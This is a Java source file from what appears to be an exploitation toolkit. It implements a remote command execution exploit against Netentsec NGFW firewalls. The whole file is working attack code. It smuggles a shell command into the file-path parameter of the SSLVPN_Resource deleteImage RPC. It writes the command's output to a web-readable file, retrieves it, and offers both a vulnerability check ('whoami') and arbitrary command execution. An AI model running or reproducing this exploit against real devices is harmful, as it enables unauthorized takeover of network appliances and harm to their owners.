package cn.exploit;

import cn.utils.HttpUtil;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import org.apache.http.Consts;
import org.apache.http.entity.StringEntity;
import java.util.HashMap;
import java.util.Map;


public class Netentsec_NGFW_RCE extends ExploitFather {

    HttpUtil httpUtil = new HttpUtil();

    @Override
    public String poc(String url) {
        StringBuffer result = new StringBuffer("不存在漏洞");
        httpUtil.url = url+"/directdata/direct/router";
        HashMap<String,String> headers = new HashMap<String,String>();
        headers.put("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 Greatwqs");
        headers.put("Content-Type","application/x-www-form-urlencoded");
        httpUtil.headers = headers;
        //设置post数据
        httpUtil.json_data = getJson("whoami");
        String[] resContent = httpUtil.doPost(true);

        if(resContent[0]!=null){
            String status_code = resContent[0];
            String text = resContent[1];
            if(status_code.equals("200") && text.toLowerCase().contains("success")){
                httpUtil.url = url + "/1.txt";
                String[] resContent2 = httpUtil.doGet();
                if(resContent2[0].equals("200")){
                    result.setLength(0);
                    result.append("存在漏洞\n当前用户为:");
                    result.append(resContent2[1]);
                }
            }
        }

        return result.toString();
    }

    @Override
    public String exp(String url, String payload) {
        StringBuffer result = new StringBuffer("执行命令失败!");
        httpUtil.url = url+"/directdata/direct/router";
        HashMap<String,String> headers = new HashMap<String,String>();
        headers.put("User-Agent","Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 Greatwqs");
        headers.put("Content-Type","application/x-www-form-urlencoded");
        httpUtil.headers = headers;
        //设置post数据
        httpUtil.json_data = getJson(payload);
        String[] resContent = httpUtil.doPost(true);

        if(resContent[0]!=null){
            String status_code = resContent[0];
            String text = resContent[1];
            if(status_code.equals("200") && text.toLowerCase().contains("success")){
                httpUtil.url = url + "/1.txt";
                String[] resContent2 = httpUtil.doGet();
                if(resContent2[0].equals("200")){
                    result.setLength(0);
                    result.append("命令回显:");
                    result.append(resContent2[1]);
                }
            }
        }

        return result.toString();
    }

    /**
     * 获取payload json数据
     * @return
     */
    public String getJson(String cmd){
        String paylaod = String.format("/var/www/html/d.txt;%s&>/var/www/html/1.txt",cmd);
        Map<String, Object> payload_json = new HashMap<>();
        payload_json.put("action", "SSLVPN_Resource");
        payload_json.put("method", "deleteImage");

        Map<String,Object> map = new HashMap<>();
        map.put("data",new String[]{paylaod});

        payload_json.put("data", new Object[]{map});
        payload_json.put("type", "rpc");
        payload_json.put("tid", 17);
        payload_json.put("f88397rqtj", "=");

        Gson gson = new GsonBuilder().disableHtmlEscaping().create();
        String json = gson.toJson(payload_json);
        return json;
    }
}
